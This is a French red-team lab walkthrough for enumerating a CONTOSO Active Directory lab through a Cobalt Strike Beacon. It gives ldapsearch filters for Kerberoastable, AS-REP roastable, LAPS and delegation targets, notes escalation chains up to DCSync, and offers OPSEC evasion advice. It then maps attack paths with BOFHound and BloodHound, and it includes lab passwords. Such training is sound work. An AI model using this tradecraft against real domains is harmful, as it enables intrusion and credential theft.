# Lab — Discovery Active Directory  

>L’objectif de ce lab est d’effectuer la **Discovery** du domaine Active Directory, puis de représenter les chemins d’attaque dans **BloodHound** à partir de données collectées avec une approche **OPSEC-🟢SAFE**.

## Vérifier l’authentification

>Avant d’utiliser `ldapsearch`, disposer d’un token Kerberos valide et injecter un TGT (**OPSEC-🟢SAFE**).  

```cs
kerberos_ticket_use C:\path\to\rsteel.kirbi
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

## LDAPSEARCH — Reconnaissance du domaine    

```cs
// GPO abuse — find GPOs applied to current machine/user OUs where we can write
ldapsearch (&(objectClass=groupPolicyContainer)) --attributes displayName,gPCFileSysPath,ntsecuritydescriptor

// Kerberoastable accounts (SPN holders) — weak password = privesc path
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName,memberOf

// LAPS — find computers where current user can read ms-Mcs-AdmPwd
ldapsearch (&(objectClass=computer)(ms-Mcs-AdmPwd=*)) --attributes name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

// AdminSDHolder protected accounts (SDProp targets — ACL abuse paths)
ldapsearch (&(adminCount=1)(objectClass=user)) --attributes samAccountName,memberOf,ntsecuritydescriptor

// Delegation misconfig — unconstrained delegation (TGT theft risk)
ldapsearch (&(samAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes name,userAccountControl,msDS-AllowedToDelegateTo

// 🧠 BOFHound 📂 output 📝 logs❗
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

## LDAPSEARCH — Delegation  

```cs
// Unconstrained delegation — any computer/user with unconstrained delegation

// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl

// Constrained delegation — can impersonate any user to the delegated service
// msDS-AllowedToDelegateTo set = protocol transition possible
ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
```

## LDAPSEARCH — Cibles Kerberoast et AS-REP Roast

```cs

// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName

// AS-REP roastable — no Kerberos pre-authentication required
// Can request AS-REP hash without any credentials
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName

// Accounts with descriptions — operators sometimes store passwords in the description field
ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
```

## LDAPSEARCH — LAPS

```cs
// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host 
ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
```

## LDAPSEARCH — Comptes privilégiés

```cs
// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf

// Domain trust enumeration
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
```

----  

## BOFHound  

1. Lancer Cobalt Strike et se connecter au team server.
2. Interagir avec le Beacon.
3. Utiliser `ldapsearch` pour énumérer le domaine, les utilisateurs, groupes, OU et GPO.
4. Copier les logs bruts du Beacon sur l’Attacker Desktop. 
5. Dans Windows Terminal, ouvrir un onglet Ubuntu.
6. `cd /mnt/c/Users/Attacker/Desktop`
7. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
8. Le mot de passe utilisé dans le lab est `Passw0rd!`.
9. **BOFHound** analyse les logs et prépare les données pour BloodHound. 
10. `bofhound -i logs`

----  

## BloodHound

1. Démarrer BloodHound.
  1. Ouvrir Docker Desktop depuis le menu Démarrer.
  1. Ouvrir la rubrique **Containers** à gauche.
  1. Démarrer tous les containers avec le bouton Play et vérifier leur état.
  1. Ouvrir Microsoft Edge depuis la barre des tâches.
  1. Ouvrir le favori BloodHound ou accéder à `http://localhost:8080/ui/login`.
  1. Si les credentials ne sont pas préremplis, utiliser `admin` et `eA%N4frBrnn2` (valeurs du lab).

⚠️ Une modification du mot de passe peut être demandée lors du premier accès.⚠️

1. Importer les données BOFHound.
  1. Après connexion, sélectionner le lien « start by uploading your data ».
  1. Cliquer sur **Upload File(s)** et choisir les fichiers JSON générés par BOFHound.

⚠️ Ils se trouvent dans `C:\Users\Attacker\Desktop\`.

  1. Attendre l’état **Complete**.

1. Cliquer sur **Explore** dans le menu de gauche.
1. Sélectionner la zone de recherche Cypher.
1. Utiliser la requête Cypher suivante pour rechercher les GPO dans BloodHound :
  1. `Match (n:GPO) return n`
  1. Cliquer sur **Run**.

1. Sélectionner la GPO **Workstation Admins**.
  1. Noter sa valeur `Gpcpath`.
  1. Déplier **Affected Objects**, puis **Computers**.

1. Sélectionner chaque ordinateur et relever son **Object ID**.

## Données Restricted Groups

1. À partir du `gpcpath` de la GPO Workstation Admins, télécharger le fichier **GptTmpl.inf** depuis le Beacon.

    ```Beacon-nocolor
    ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
    download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```
1. Synchroniser le fichier vers l’Attacker Desktop.

⚠️ Dans Cobalt Strike : **View > Downloads**.

1. Ouvrir le fichier avec Notepad ou VS Code.
  1. Relever le SID du groupe de domaine.

1. Ajouter les relations (**custom edges**) dans BloodHound.

    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```
    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

BloodHound indique alors que `rsteel` possède des privilèges administrateur locaux sur WKSTN-1 et WKSTN-2.

⚠️ Ce lab utilise les requêtes LDAP et BloodHound pour cartographier une partie du domaine CONTOSO.  

---

## Avertissements OPSEC et notes d’examen

### ldapsearch renvoie 0 résultat — Limite du token WinRM

`ldapsearch` se connecte au DC avec le token Kerberos courant du Beacon. Un Beacon obtenu via
`jump winrm64` possède un **network logon token Type 3** non transmissible, qui ne fournit pas
les credentials Kerberos nécessaires à une connexion supplémentaire vers le DC.

**Symptôme :**
```
Binding to 10.10.120.1
retrieved 0 results total
```

---

### OPSEC-🔴UNSAFE — Commandes à éviter

`net computers` et les commandes `net *` sont classées **OPSEC-🔴UNSAFE** dans ces notes : elles passent par `shell`, qui lance  
`cmd.exe`. Depuis un network logon token, elles peuvent aussi échouer avec **Error 5**.  
`net computers` — OPSEC-🔴UNSAFE : crée `cmd.exe`   `ldapsearch (samAccountType=805306369)`  
`net users` — OPSEC-🔴UNSAFE : crée `cmd.exe`   `ldapsearch (samAccountType=805306368)`  
`net groups` — OPSEC-🔴UNSAFE : crée `cmd.exe`  `ldapsearch (samAccountType=268435456)`  
